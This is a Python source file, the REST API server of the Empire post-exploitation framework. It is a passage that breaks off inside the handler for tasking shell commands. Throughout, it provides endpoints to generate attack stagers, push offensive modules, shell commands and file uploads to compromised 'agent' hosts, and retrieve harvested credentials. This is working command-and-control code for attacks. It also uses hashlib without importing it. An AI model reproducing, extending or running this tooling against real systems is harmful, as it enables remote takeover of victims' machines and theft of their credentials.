#!/usr/bin/env python

import sqlite3, argparse, sys, argparse, logging, json, string
import os, re, time, signal, copy, base64, pickle
from flask import Flask, request, jsonify, make_response, abort, url_for
from time import localtime, strftime, sleep
from OpenSSL import SSL
from Crypto.Random import random

# Empire imports
from lib.common import empire
from lib.common import helpers

global serverExitCommand
serverExitCommand = 'restart'

#####################################################
#
# Database interaction methods for the RESTful API
#
#####################################################

def database_connect():
    """
    Connect with the backend ./empire.db sqlite database and return the
    connection object.
    """
    try:
        # set the database connectiont to autocommit w/ isolation level
        conn = sqlite3.connect('./data/empire.db', check_same_thread=False)
        conn.text_factory = str
        conn.isolation_level = None
        return conn

    except Exception:
        print helpers.color("[!] Could not connect to database")
        print helpers.color("[!] Please run database_setup.py")
        sys.exit()


def execute_db_query(conn, query, args=None):
    """
    Execute the supplied query on the provided db conn object
    with optional args for a paramaterized query.
    """
    cur = conn.cursor()
    if args:
        cur.execute(query, args)
    else:
        cur.execute(query)
    results = cur.fetchall()
    cur.close()
    return results


def refresh_api_token(conn):
    """
    Generates a randomized RESTful API token and updates the value
    in the config stored in the backend database.
    """

    # generate a randomized API token
    apiToken = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(40))

    execute_db_query(conn, "UPDATE config SET api_current_token=?", [apiToken])

    return apiToken


def get_permanent_token(conn):
    """
    Returns the permanent API token stored in empire.db.

    If one doesn't exist, it will generate one and store it before returning.
    """

    permanentToken = execute_db_query(conn, "SELECT api_permanent_token FROM config")[0]
    if not permanentToken[0]:
        permanentToken = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(40))
        execute_db_query(conn, "UPDATE config SET api_permanent_token=?", [permanentToken])

    return permanentToken[0]


####################################################################
#
# The Empire RESTful API.
#
# Adapted from http://blog.miguelgrinberg.com/post/designing-a-restful-api-with-python-and-flask
#   example code at https://gist.github.com/miguelgrinberg/5614326
#
#    Verb     URI                                            Action
#    ----     ---                                            ------
#    GET      http://localhost:1337/api/version              return the current Empire version
#
#    GET      http://localhost:1337/api/config               return the current default config
#
#    GET      http://localhost:1337/api/stagers              return all current stagers
#    GET      http://localhost:1337/api/stagers/X            return the stager with name X
#    POST     http://localhost:1337/api/stagers              generate a stager given supplied options (need to implement)
#
#    GET      http://localhost:1337/api/modules                     return all current modules
#    GET      http://localhost:1337/api/modules/<name>              return the module with the specified name
#    POST     http://localhost:1337/api/modules/<name>              execute the given module with the specified options
#    POST     http://localhost:1337/api/modules/search              searches modulesfor a passed term
#    POST     http://localhost:1337/api/modules/search/modulename   searches module names for a specific term
#    POST     http://localhost:1337/api/modules/search/description  searches module descriptions for a specific term
#    POST     http://localhost:1337/api/modules/search/description  searches module comments for a specific term
#    POST     http://localhost:1337/api/modules/search/author       searches module authors for a specific term
#
#    GET      http://localhost:1337/api/listeners            return all current listeners
#    GET      http://localhost:1337/api/listeners/Y          return the listener with id Y
#    GET      http://localhost:1337/api/listeners/options    return all listener options
#    POST     http://localhost:1337/api/listeners            starts a new listener with the specified options
#    DELETE   http://localhost:1337/api/listeners/Y          kills listener Y
#
#    GET      http://localhost:1337/api/agents               return all current agents
#    GET      http://localhost:1337/api/agents/stale         return all stale agents
#    DELETE   http://localhost:1337/api/agents/stale         removes stale agents from the database
#    DELETE   http://localhost:1337/api/agents/Y             removes agent Y from the database
#    GET      http://localhost:1337/api/agents/Y             return the agent with name Y
#    GET      http://localhost:1337/api/agents/Y/results     return tasking results for the agent with name Y
#    DELETE   http://localhost:1337/api/agents/Y/results     deletes the result buffer for agent Y
#    POST     http://localhost:1337/api/agents/Y/shell       task agent Y to execute a shell command
#    POST     http://localhost:1337/api/agents/Y/rename      rename agent Y
#    GET/POST http://localhost:1337/api/agents/Y/clear       clears the result buffer for agent Y
#    GET/POST http://localhost:1337/api/agents/Y/kill        kill agent Y
#
#    GET      http://localhost:1337/api/reporting            return all logged events
#    GET      http://localhost:1337/api/reporting/agent/X    return all logged events for the given agent name X
#    GET      http://localhost:1337/api/reporting/type/Y     return all logged events of type Y (checkin, task, result, rename)
#    GET      http://localhost:1337/api/reporting/msg/Z      return all logged events matching message Z, wildcards accepted
#
#    GET      http://localhost:1337/api/creds                return stored credentials
#
#    GET      http://localhost:1337/api/admin/login          retrieve the API token given the correct username and password
#    GET      http://localhost:1337/api/admin/permanenttoken retrieve the permanent API token, generating/storing one if it doesn't already exist
#    GET      http://localhost:1337/api/admin/shutdown       shutdown the RESTful API
#    GET      http://localhost:1337/api/admin/restart        restart the RESTful API
#
####################################################################

def start_restful_api(empireMenu, suppress=False, username=None, password=None, port=1337):
    """
    Kick off the RESTful API with the given parameters.

    empireMenu  -   Main empire menu object
    suppress    -   suppress most console output
    username    -   optional username to use for the API, otherwise pulls from the empire.db config
    password    -   optional password to use for the API, otherwise pulls from the empire.db config
    port        -   port to start the API on, defaults to 1337 ;)
    """

    app = Flask(__name__)

    conn = database_connect()

    main = empireMenu

    global serverExitCommand

    # if a username/password were not supplied, use the creds stored in the db

    (dbUsername, dbPassword) = execute_db_query(conn, "SELECT api_username, api_password FROM config")[0]

    if not username:
        username = dbUsername
    else:
        execute_db_query(conn, "UPDATE config SET api_username=?", username)

    if not password:
        password = dbPassword
    else:
        execute_db_query(conn, "UPDATE config SET api_password=?", password)

    print ''

    print " * Starting Empire RESTful API on port: %s" %(port)

    # refresh the token for the RESTful API
    apiToken = refresh_api_token(conn)
    print " * RESTful API token: %s" %(apiToken)

    permanentApiToken = get_permanent_token(conn)
    tokenAllowed = re.compile("^[0-9a-z]{40}")

    oldStdout = sys.stdout
    if suppress:
        # suppress the normal Flask output
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        # suppress all stdout and don't initiate the main cmdloop
        sys.stdout = open(os.devnull, 'w')

    # validate API token before every request except for the login URI
    @app.before_request
    def check_token():
        """
        Before every request, check if a valid token is passed along with the request.
        """
        if request.path != '/api/admin/login':
            token = request.args.get('token')
            if (not token) or (not tokenAllowed.match(token)):
                return make_response('', 401)
            if (token != apiToken) and (token != permanentApiToken):
                return make_response('', 401)


    @app.errorhandler(Exception)
    def exception_handler(error):
        """
        Generic exception handler.
        """
        return repr(error)


    @app.errorhandler(404)
    def not_found(error):
        """
        404/not found handler.
        """
        return make_response(jsonify({'error': 'Not found'}), 404)


    @app.route('/api/version', methods=['GET'])
    def get_version():
        """
        Returns the current Empire version.
        """
        return jsonify({'version': empire.VERSION})


    @app.route('/api/map', methods=['GET'])
    def list_routes():
        """
        List all of the current registered API routes.
        """
        import urllib
        output = []
        for rule in app.url_map.iter_rules():

            options = {}
            for arg in rule.arguments:
                options[arg] = "[{0}]".format(arg)

            methods = ','.join(rule.methods)
            url = url_for(rule.endpoint, **options)
            line = urllib.unquote("[ { '" + rule.endpoint + "': [ { 'methods': '" + methods + "', 'url': '" + url + "' } ] } ]")
            output.append(line)

        res = ''
        for line in sorted(output):
            res = res + '\r\n' + line
        return jsonify({'Routes':res})


    @app.route('/api/config', methods=['GET'])
    def get_config():
        """
        Returns JSON of the current Empire config.
        """
        configRaw = execute_db_query(conn, 'SELECT staging_key, install_path, ip_whitelist, ip_blacklist, autorun_command, autorun_data, rootuser, api_username, api_password, api_current_token, api_permanent_token FROM config')

        [staging_key, install_path, ip_whitelist, ip_blacklist, autorun_command, autorun_data, rootuser, api_username, api_password, api_current_token, api_permanent_token] = configRaw[0]
        config = [{"api_password":api_password, "api_username":api_username, "autorun_command":autorun_command, "autorun_data":autorun_data, "current_api_token":api_current_token, "install_path":install_path, "ip_blacklist":ip_blacklist, "ip_whitelist":ip_whitelist, "permanent_api_token":api_permanent_token, "staging_key":staging_key, "version":empire.VERSION}]

        return jsonify({'config': config})


    @app.route('/api/stagers', methods=['GET'])
    def get_stagers():
        """
        Returns JSON describing all stagers.
        """

        stagers = []
        for stagerName, stager in main.stagers.stagers.iteritems():
            info = copy.deepcopy(stager.info)
            info['options'] = stager.options
            info['Name'] = stagerName
            stagers.append(info)

        return jsonify({'stagers': stagers})


    @app.route('/api/stagers/<path:stager_name>', methods=['GET'])
    def get_stagers_name(stager_name):
        """
        Returns JSON describing the specified stager_name passed.
        """
        if stager_name not in main.stagers.stagers:
            return make_response(jsonify({'error': 'stager name %s not found, make sure to use [os]/[name] format, ie. windows/dll' %(stager_name)}), 404)

        stagers = []
        for stagerName, stager in main.stagers.stagers.iteritems():
            if stagerName == stager_name:
                info = copy.deepcopy(stager.info)
                info['options'] = stager.options
                info['Name'] = stagerName
                stagers.append(info)

        return jsonify({'stagers': stagers})


    @app.route('/api/stagers', methods=['POST'])
    def generate_stager():
        """
        Generates a stager with the supplied config and returns JSON information
        describing the generated stager, with 'Output' being the stager output.

        Required JSON args:
            StagerName      -   the stager name to generate
            Listener        -   the Listener name to use for the stager
        """
        if not request.json or not 'StagerName' in request.json or not 'Listener' in request.json:
            abort(400)

        stagerName = request.json['StagerName']
        listener = request.json['Listener']

        if stagerName not in main.stagers.stagers:
            return make_response(jsonify({'error': 'stager name %s not found' %(stagerName)}), 404)

        if not main.listeners.is_listener_valid(listener):
            return make_response(jsonify({'error': 'invalid listener ID or name'}), 400)

        stager = main.stagers.stagers[stagerName]

        # set all passed options
        for option, values in request.json.iteritems():
            if option != 'StagerName':
                if option not in stager.options:
                    return make_response(jsonify({'error': 'Invalid option %s, check capitalization.' %(option)}), 400)
                stager.options[option]['Value'] = values

        # validate stager options
        for option, values in stager.options.iteritems():
            if values['Required'] and ((not values['Value']) or (values['Value'] == '')):
                return make_response(jsonify({'error': 'required stager options missing'}), 400)

        stagerOut = copy.deepcopy(stager.options)

        if ('OutFile' in stagerOut) and (stagerOut['OutFile']['Value'] != ''):
            # if the output was intended for a file, return the base64 encoded text
            stagerOut['Output'] = base64.b64encode(stager.generate())
        else:
            # otherwise return the text of the stager generation
            stagerOut['Output'] = stager.generate()

        return jsonify({stagerName: stagerOut})


    @app.route('/api/modules', methods=['GET'])
    def get_modules():
        """
        Returns JSON describing all currently loaded modules.
        """

        modules = []
        for moduleName, module in main.modules.modules.iteritems():
            moduleInfo = copy.deepcopy(module.info)
            moduleInfo['options'] = module.options
            moduleInfo['Name'] = moduleName
            modules.append(moduleInfo)

        return jsonify({'modules': modules})


    @app.route('/api/modules/<path:module_name>', methods=['GET'])
    def get_module_name(module_name):
        """
        Returns JSON describing the specified currently module.
        """

        if module_name not in main.modules.modules:
            return make_response(jsonify({'error': 'module name %s not found' %(module_name)}), 404)

        modules = []
        moduleInfo = copy.deepcopy(main.modules.modules[module_name].info)
        moduleInfo['options'] = main.modules.modules[module_name].options
        moduleInfo['Name'] = module_name
        modules.append(moduleInfo)

        return jsonify({'modules': modules})


    @app.route('/api/modules/<path:module_name>', methods=['POST'])
    def execute_module(module_name):
        """
        Executes a given module name with the specified parameters.
        """

        # ensure the 'Agent' argument is set
        if not request.json or not 'Agent' in request.json:
            abort(400)

        if module_name not in main.modules.modules:
            return make_response(jsonify({'error': 'module name %s not found' %(module_name)}), 404)

        module = main.modules.modules[module_name]

        # set all passed module options
        for key, value in request.json.iteritems():
            if key not in module.options:
                return make_response(jsonify({'error': 'invalid module option'}), 400)

            module.options[key]['Value'] = value

        # validate module options
        sessionID = module.options['Agent']['Value']

        for option, values in module.options.iteritems():
            if values['Required'] and ((not values['Value']) or (values['Value'] == '')):
                return make_response(jsonify({'error': 'required module option missing'}), 400)

        try:
            # if we're running this module for all agents, skip this validation
            if sessionID.lower() != "all" and sessionID.lower() != "autorun":

                if not main.agents.is_agent_present(sessionID):
                    return make_response(jsonify({'error': 'invalid agent name'}), 400)

                modulePSVersion = int(module.info['MinLanguageVersion'])
                agentPSVersion = int(main.agents.get_language_version_db(sessionID))
                # check if the agent/module PowerShell versions are compatible
                if modulePSVersion > agentPSVersion:
                    return make_response(jsonify({'error': "module requires PS version "+str(modulePSVersion)+" but agent running PS version "+str(agentPSVersion)}), 400)

        except Exception as e:
            return make_response(jsonify({'error': 'exception: %s' %(e)}), 400)

        # check if the module needs admin privs
        if module.info['NeedsAdmin']:
            # if we're running this module for all agents, skip this validation
            if sessionID.lower() != "all" and sessionID.lower() != "autorun":
                if not main.agents.is_agent_elevated(sessionID):
                    return make_response(jsonify({'error': 'module needs to run in an elevated context'}), 400)


        # actually execute the module
        moduleData = module.generate()

        if not moduleData or moduleData == "":
            return make_response(jsonify({'error': 'module produced an empty script'}), 400)

        try:
            moduleData.decode('ascii')
        except UnicodeDecodeError:
            return make_response(jsonify({'error': 'module source contains non-ascii characters'}), 400)

        moduleData = helpers.strip_powershell_comments(moduleData)
        taskCommand = ""

        # build the appropriate task command and module data blob
        if str(module.info['Background']).lower() == "true":
            # if this module should be run in the background
            extention = module.info['OutputExtension']
            if extention and extention != "":
                # if this module needs to save its file output to the server
                #   format- [15 chars of prefix][5 chars extension][data]
                saveFilePrefix = module_name.split("/")[-1]
                moduleData = saveFilePrefix.rjust(15) + extention.rjust(5) + moduleData
                taskCommand = "TASK_CMD_JOB_SAVE"
            else:
                taskCommand = "TASK_CMD_JOB"

        else:
            # if this module is run in the foreground
            extention = module.info['OutputExtension']
            if module.info['OutputExtension'] and module.info['OutputExtension'] != "":
                # if this module needs to save its file output to the server
                #   format- [15 chars of prefix][5 chars extension][data]
                saveFilePrefix = module_name.split("/")[-1][:15]
                moduleData = saveFilePrefix.rjust(15) + extention.rjust(5) + moduleData
                taskCommand = "TASK_CMD_WAIT_SAVE"
            else:
                taskCommand = "TASK_CMD_WAIT"

        if sessionID.lower() == "all":

            for agent in main.agents.get_agents():
                sessionID = agent[1]
                taskID = main.agents.add_agent_task_db(sessionID, taskCommand, moduleData)
                msg = "tasked agent %s to run module %s" %(sessionID, module_name)
                main.agents.save_agent_log(sessionID, msg)

            msg = "tasked all agents to run module %s" %(module_name)
            return jsonify({'success': True, 'taskID': taskID, 'msg':msg})

        else:
            # set the agent's tasking in the cache
            taskID = main.agents.add_agent_task_db(sessionID, taskCommand, moduleData)

            # update the agent log
            msg = "tasked agent %s to run module %s" %(sessionID, module_name)
            main.agents.save_agent_log(sessionID, msg)
            return jsonify({'success': True, 'taskID': taskID, 'msg':msg})


    @app.route('/api/modules/search', methods=['POST'])
    def search_modules():
        """
        Returns JSON describing the the modules matching the passed
        'term' search parameter. Module name, description, comments,
        and author fields are searched.
        """

        if not request.json or not 'term':
            abort(400)

        searchTerm = request.json['term']

        modules = []

        for moduleName, module in main.modules.modules.iteritems():
            if (searchTerm.lower() == '') or (searchTerm.lower() in moduleName.lower()) or (searchTerm.lower() in ("".join(module.info['Description'])).lower()) or (searchTerm.lower() in ("".join(module.info['Comments'])).lower()) or (searchTerm.lower() in ("".join(module.info['Author'])).lower()):

                moduleInfo = copy.deepcopy(main.modules.modules[moduleName].info)
                moduleInfo['options'] = main.modules.modules[moduleName].options
                moduleInfo['Name'] = moduleName
                modules.append(moduleInfo)

        return jsonify({'modules': modules})


    @app.route('/api/modules/search/modulename', methods=['POST'])
    def search_modules_name():
        """
        Returns JSON describing the the modules matching the passed
        'term' search parameter for the modfule name.
        """

        if not request.json or not 'term':
            abort(400)

        searchTerm = request.json['term']

        modules = []

        for moduleName, module in main.modules.modules.iteritems():
            if (searchTerm.lower() == '') or (searchTerm.lower() in moduleName.lower()):

                moduleInfo = copy.deepcopy(main.modules.modules[moduleName].info)
                moduleInfo['options'] = main.modules.modules[moduleName].options
                moduleInfo['Name'] = moduleName
                modules.append(moduleInfo)

        return jsonify({'modules': modules})


    @app.route('/api/modules/search/description', methods=['POST'])
    def search_modules_description():
        """
        Returns JSON describing the the modules matching the passed
        'term' search parameter for the 'Description' field.
        """

        if not request.json or not 'term':
            abort(400)

        searchTerm = request.json['term']

        modules = []

        for moduleName, module in main.modules.modules.iteritems():
            if (searchTerm.lower() == '') or (searchTerm.lower() in ("".join(module.info['Description'])).lower()):

                moduleInfo = copy.deepcopy(main.modules.modules[moduleName].info)
                moduleInfo['options'] = main.modules.modules[moduleName].options
                moduleInfo['Name'] = moduleName
                modules.append(moduleInfo)

        return jsonify({'modules': modules})


    @app.route('/api/modules/search/comments', methods=['POST'])
    def search_modules_comments():
        """
        Returns JSON describing the the modules matching the passed
        'term' search parameter for the 'Comments' field.
        """

        if not request.json or not 'term':
            abort(400)

        searchTerm = request.json['term']

        modules = []

        for moduleName, module in main.modules.modules.iteritems():
            if (searchTerm.lower() == '') or (searchTerm.lower() in ("".join(module.info['Comments'])).lower()):

                moduleInfo = copy.deepcopy(main.modules.modules[moduleName].info)
                moduleInfo['options'] = main.modules.modules[moduleName].options
                moduleInfo['Name'] = moduleName
                modules.append(moduleInfo)

        return jsonify({'modules': modules})


    @app.route('/api/modules/search/author', methods=['POST'])
    def search_modules_author():
        """
        Returns JSON describing the the modules matching the passed
        'term' search parameter for the 'Author' field.
        """

        if not request.json or not 'term':
            abort(400)

        searchTerm = request.json['term']

        modules = []

        for moduleName, module in main.modules.modules.iteritems():
            if (searchTerm.lower() == '') or (searchTerm.lower() in ("".join(module.info['Author'])).lower()):

                moduleInfo = copy.deepcopy(main.modules.modules[moduleName].info)
                moduleInfo['options'] = main.modules.modules[moduleName].options
                moduleInfo['Name'] = moduleName
                modules.append(moduleInfo)

        return jsonify({'modules': modules})


    @app.route('/api/listeners', methods=['GET'])
    def get_listeners():
        """
        Returns JSON describing all currently registered listeners.
        """
        activeListenersRaw = execute_db_query(conn, 'SELECT id, name, module, listener_type, listener_category, options FROM listeners')
        listeners = []

        for activeListener in activeListenersRaw:
            [ID, name, module, listener_type, listener_category, options] = activeListener
            listeners.append({'ID':ID, 'name':name, 'module':module, 'listener_type':listener_type, 'listener_category':listener_category, 'options':pickle.loads(activeListener[5]) })  


        return jsonify({'listeners' : listeners})


    @app.route('/api/listeners/<string:listener_name>', methods=['GET'])
    def get_listener_name(listener_name):
        """
        Returns JSON describing the listener specified by listener_name.
        """
        activeListenersRaw = execute_db_query(conn, 'SELECT id, name, module, listener_type, listener_category, options FROM listeners WHERE name=?', [listener_name])
        listeners = []

        #if listener_name != "" and main.listeners.is_listener_valid(listener_name):
        for activeListener in activeListenersRaw:
            [ID, name, module, listener_type, listener_category, options] = activeListener
            if name == listener_name:
                listeners.append({'ID':ID, 'name':name, 'module':module, 'listener_type':listener_type, 'listener_category':listener_category, 'options':pickle.loads(activeListener[5]) })

            return jsonify({'listeners' : listeners})
        else:
            return make_response(jsonify({'error': 'listener name %s not found' %(listener_name)}), 404)


    @app.route('/api/listeners/<string:listener_name>', methods=['DELETE'])
    def kill_listener(listener_name):
        """
        Kills the listener specified by listener_name.
        """
        if listener_name.lower() == "all":
            activeListenersRaw = execute_db_query(conn, 'SELECT id, name, module, listener_type, listener_category, options FROM listeners')
            for activeListener in activeListenersRaw:
                [ID, name, module, listener_type, listener_category, options] = activeListener
                main.listeners.kill_listener(name)

            return jsonify({'success': True})
        else:
            if listener_name != "" and main.listeners.is_listener_valid(listener_name):
                main.listeners.kill_listener(listener_name)
                return jsonify({'success': True})
            else:
                return make_response(jsonify({'error': 'listener name %s not found' %(listener_name)}), 404)


    @app.route('/api/listeners/options/<string:listener_type>', methods=['GET'])
    def get_listener_options(listener_type):
        """
        Returns JSON describing listener options for the specified listener type.
        """

        if listener_type.lower() not in main.listeners.loadedListeners:
            return make_response(jsonify({'error':'listener type %s not found' %(listener_type)}), 404)

        options = main.listeners.loadedListeners[listener_type].options
        return jsonify({'listeneroptions' : options})


    @app.route('/api/listeners/<string:listener_type>', methods=['POST'])
    def start_listener(listener_type):
        """
        Starts a listener with options supplied in the POST.
        """
        if listener_type.lower() not in main.listeners.loadedListeners:
            return make_response(jsonify({'error':'listener type %s not found' %(listener_type)}), 404)

        listenerObject = main.listeners.loadedListeners[listener_type]
        # set all passed options
        for option, values in request.json.iteritems():
            if option == "Name":
                listenerName = values

            returnVal = main.listeners.set_listener_option(listener_type, option, values)
            if not returnVal:
                 return make_response(jsonify({'error': 'error setting listener value %s with option %s' %(option, values)}), 400)
        
        main.listeners.start_listener(listener_type, listenerObject)

        #check to see if the listener was created
        listenerID = main.listeners.get_listener_id(listenerName)
        if listenerID:
            return jsonify({'success': 'listener %s successfully started' % listenerName})
        else:
            return jsonify({'error': 'failed to start listener %s' % listenerName})


    @app.route('/api/agents', methods=['GET'])
    def get_agents():
        """
        Returns JSON describing all currently registered agents.
        """
        activeAgentsRaw = execute_db_query(conn, 'SELECT id, session_id, listener, name, language, language_version, delay, jitter, external_ip, '+
            'internal_ip, username, high_integrity, process_name, process_id, hostname, os_details, session_key, nonce, checkin_time, '+
            'lastseen_time, parent, children, servers, profile, functions, kill_date, working_hours, lost_limit, taskings, results FROM agents')
        agents = []

        for activeAgent in activeAgentsRaw:
            [ID, session_id, listener, name, language, language_version, delay, jitter, external_ip, internal_ip, username, high_integrity, process_name, process_id, hostname, os_details, session_key, nonce, checkin_time, lastseen_time, parent, children, servers, profile, functions, kill_date, working_hours, lost_limit, taskings, results] = activeAgent

            agents.append({"ID":ID, "session_id":session_id, "listener":listener, "name":name, "language":language, "language_version":language_version, "delay":delay, "jitter":jitter, "external_ip":external_ip, "internal_ip":internal_ip, "username":username, "high_integrity":high_integrity, "process_name":process_name, "process_id":process_id, "hostname":hostname, "os_details":os_details, "session_key":session_key, "nonce":nonce, "checkin_time":checkin_time, "lastseen_time":lastseen_time, "parent":parent, "children":children, "servers":servers, "profile":profile,"functions":functions, "kill_date":kill_date, "working_hours":working_hours, "lost_limit":lost_limit, "taskings":taskings, "results":results})

        return jsonify({'agents' : agents})


    @app.route('/api/agents/stale', methods=['GET'])
    def get_agents_stale():
        """
        Returns JSON describing all stale agents.
        """

        agentsRaw = execute_db_query(conn, 'SELECT id, session_id, listener, name, language, language_version, delay, jitter, external_ip, '+
            'internal_ip, username, high_integrity, process_name, process_id, hostname, os_details, session_key, nonce, checkin_time, '+
            'lastseen_time, parent, children, servers, profile, functions, kill_date, working_hours, lost_limit, taskings, results FROM agents')
        staleAgents = []

        for agent in agentsRaw:
            [ID, session_id, listener, name, language, language_version, delay, jitter, external_ip, internal_ip, username, high_integrity, process_name, process_id, hostname, os_details, session_key, nonce, checkin_time, lastseen_time, parent, children, servers, profile, functions, kill_date, working_hours, lost_limit, taskings, results] = agent

            intervalMax = (delay + delay * jitter)+30

            # get the agent last check in time
            agentTime = time.mktime(time.strptime(lastseen_time, "%Y-%m-%d %H:%M:%S"))

            if agentTime < time.mktime(time.localtime()) - intervalMax:

                staleAgents.append({"ID":ID, "session_id":session_id, "listener":listener, "name":name, "language":language, "language_version":language_version, "delay":delay, "jitter":jitter, "external_ip":external_ip, "internal_ip":internal_ip, "username":username, "high_integrity":high_integrity, "process_name":process_name, "process_id":process_id, "hostname":hostname, "os_details":os_details, "session_key":session_key, "nonce":nonce, "checkin_time":checkin_time, "lastseen_time":lastseen_time, "parent":parent, "children":children, "servers":servers, "profile":profile,"functions":functions, "kill_date":kill_date, "working_hours":working_hours, "lost_limit":lost_limit, "taskings":taskings, "results":results})

        return jsonify({'agents' : staleAgents})


    @app.route('/api/agents/stale', methods=['DELETE'])
    def remove_stale_agent():
        """
        Removes stale agents from the controller.

        WARNING: doesn't kill the agent first! Ensure the agent is dead.
        """
        agentsRaw = execute_db_query(conn, 'SELECT * FROM agents')

        for agent in agentsRaw:
            [ID, sessionID, listener, name, language, language_version, delay, jitter, external_ip, internal_ip, username, high_integrity, process_name, process_id, hostname, os_details, session_key, nonce, checkin_time, lastseen_time, parent, children, servers, profile, functions, kill_date, working_hours, lost_limit, taskings, results] = agent

            intervalMax = (delay + delay * jitter)+30

            # get the agent last check in time
            agentTime = time.mktime(time.strptime(lastseen_time, "%Y-%m-%d %H:%M:%S"))

            if agentTime < time.mktime(time.localtime()) - intervalMax:
                execute_db_query(conn, "DELETE FROM agents WHERE session_id LIKE ?", [sessionID])

        return jsonify({'success': True})


    @app.route('/api/agents/<string:agent_name>', methods=['DELETE'])
    def remove_agent(agent_name):
        """
        Removes an agent from the controller specified by agent_name.

        WARNING: doesn't kill the agent first! Ensure the agent is dead.
        """
        if agent_name.lower() == "all":
            # enumerate all target agent sessionIDs
            agentNameIDs = execute_db_query(conn, "SELECT name,session_id FROM agents WHERE name like '%' OR session_id like '%'")
        else:
            agentNameIDs = execute_db_query(conn, 'SELECT name,session_id FROM agents WHERE name like ? OR session_id like ?', [agent_name, agent_name])

        if not agentNameIDs or len(agentNameIDs) == 0:
            return make_response(jsonify({'error': 'agent name %s not found' %(agent_name)}), 404)

        for agentNameID in agentNameIDs:
            (agentName, agentSessionID) = agentNameID

            execute_db_query(conn, "DELETE FROM agents WHERE session_id LIKE ?", [agentSessionID])

        return jsonify({'success': True})


    @app.route('/api/agents/<string:agent_name>', methods=['GET'])
    def get_agents_name(agent_name):
        """
        Returns JSON describing the agent specified by agent_name.
        """
        activeAgentsRaw = execute_db_query(conn, 'SELECT id, session_id, listener, name, language, language_version, delay, jitter, external_ip, '+
            'internal_ip, username, high_integrity, process_name, process_id, hostname, os_details, session_key, nonce, checkin_time, '+
            'lastseen_time, parent, children, servers, profile, functions, kill_date, working_hours, lost_limit, taskings, results FROM agents ' +
            'WHERE name=? OR session_id=?', [agent_name, agent_name])
        activeAgents = []

        for activeAgent in activeAgentsRaw:
            [ID, session_id, listener, name, language, language_version, delay, jitter, external_ip, internal_ip, username, high_integrity, process_name, process_id, hostname, os_details, session_key, nonce, checkin_time, lastseen_time, parent, children, servers, profile, functions, kill_date, working_hours, lost_limit, taskings, results] = activeAgent
            activeAgents.append({"ID":ID, "session_id":session_id, "listener":listener, "name":name, "language":language, "language_version":language_version, "delay":delay, "jitter":jitter, "external_ip":external_ip, "internal_ip":internal_ip, "username":username, "high_integrity":high_integrity, "process_name":process_name, "process_id":process_id, "hostname":hostname, "os_details":os_details, "session_key":session_key, "nonce":nonce, "checkin_time":checkin_time, "lastseen_time":lastseen_time, "parent":parent, "children":children, "servers":servers, "profile":profile,"functions":functions, "kill_date":kill_date, "working_hours":working_hours, "lost_limit":lost_limit, "taskings":taskings, "results":results})

        return jsonify({'agents' : activeAgents})


    @app.route('/api/agents/<string:agent_name>/results', methods=['GET'])
    def get_agent_results(agent_name):
        """
        Returns JSON describing the agent's results and removes the result field
        from the backend database.
        """
        agentTaskResults = []

        if agent_name.lower() == "all":
            # enumerate all target agent sessionIDs
            agentNameIDs = execute_db_query(conn, "SELECT name, session_id FROM agents WHERE name like '%' OR session_id like '%'")
        else:
            agentNameIDs = execute_db_query(conn, 'SELECT name, session_id FROM agents WHERE name like ? OR session_id like ?', [agent_name, agent_name])
        
        for agentNameID in agentNameIDs:
            [agentName, agentSessionID] = agentNameID

            agentResults = execute_db_query(conn, 'SELECT id, agent, data FROM results WHERE agent=?', [agentSessionID])

            for result in agentResults:
                [resultid, agent, data] = result
                agentTaskResults.append({"taskID":result[0], "agentname":result[1], "results":result[2]})

        return jsonify({'results': agentTaskResults})


    @app.route('/api/agents/<string:agent_name>/results', methods=['DELETE'])
    def delete_agent_results(agent_name):
        """
        Removes the specified agent results field from the backend database.
        """
        if agent_name.lower() == "all":
            # enumerate all target agent sessionIDs
            agentNameIDs = execute_db_query(conn, "SELECT name,session_id FROM agents WHERE name like '%' OR session_id like '%'")
        else:
            agentNameIDs = execute_db_query(conn, 'SELECT name,session_id FROM agents WHERE name like ? OR session_id like ?', [agent_name, agent_name])

        if not agentNameIDs or len(agentNameIDs) == 0:
            return make_response(jsonify({'error': 'agent name %s not found' %(agent_name)}), 404)

        for agentNameID in agentNameIDs:
            (agentName, agentSessionID) = agentNameID

            
            execute_db_query(conn, 'UPDATE agents SET results=? WHERE session_id=?', ['', agentSessionID])

        return jsonify({'success': True})

    @app.route('/api/agents/<string:agent_name>/upload', methods=['POST'])
    def task_agent_upload(agent_name):
        """
        Tasks the specified agent to upload a file
        """

        if agent_name.lower() == "all":
            # enumerate all target agent sessionIDs
            agentNameIDs = execute_db_query(conn, "SELECT name,session_id FROM agents WHERE name like '%' OR session_id like '%'")
        else:
            agentNameIDs = execute_db_query(conn, 'SELECT name,session_id FROM agents WHERE name like ? OR session_id like ?', [agent_name, agent_name])

        if not agentNameIDs or len(agentNameIDs) == 0:
            return make_response(jsonify({'error': 'agent name %s not found' %(agent_name)}), 404)

        if not request.json['data']:
            return make_response(jsonify({'error':'file data not provided'}), 404)

        if not request.json['filename']:
            return make_response(jsonify({'error':'file name not provided'}), 404)

        fileData = request.json['data']
        fileName = request.json['filename']

        rawBytes = base64.b64decode(fileData)

        if len(rawBytes) > 1048576:
            return make_response(jsonify({'error':'file size too large'}), 404)

        for agentNameID in agentNameIDs:
            (agentName, agentSessionID) = agentNameID

            msg = "Tasked agent to upload %s : %s" % (fileName, hashlib.md5(rawBytes).hexdigest())
            main.agents.save_agent_log(agentSessionID, msg)
            data = fileName + "|" + fileData
            main.agents.add_agent_task_db(agentSessionID, 'TASK_UPLOAD', data)

        return jsonify({'success': True})

    @app.route('/api/agents/<string:agent_name>/shell', methods=['POST'])
    def task_agent_shell(agent_name):
        """
        Tasks an the specified agent_name to execute a shell command.

        Takes {'command':'shell_command'}
        """
        if agent_name.lower() == "all":
            # enumerate all target agent sessionIDs
            agentNameIDs = execute_db_query(conn, "SELECT name,session_id FROM agents WHERE name like '%' OR session_id like '%'")
        else:
            agentNameIDs = execute_db_query(conn, 'SELECT name,session_id FROM agents WHERE name like ? OR session_id like ?', [agent_name, agent_name])

        if not agentNameIDs or len(agentNameIDs) == 0:
            return make_response(jsonify({'error': 'agent name %s not found' %(agent_name)}), 404)

        command = request.json['command']

        for agentNameID in agentNameIDs:
            (agentName, agentSessionID) = agentNameID

            # add task command to agent taskings
            msg = "tasked agent %s to run command %s" %(agentSessionID, command)
            main.agents.save_agent_log(agentSessionID, msg)
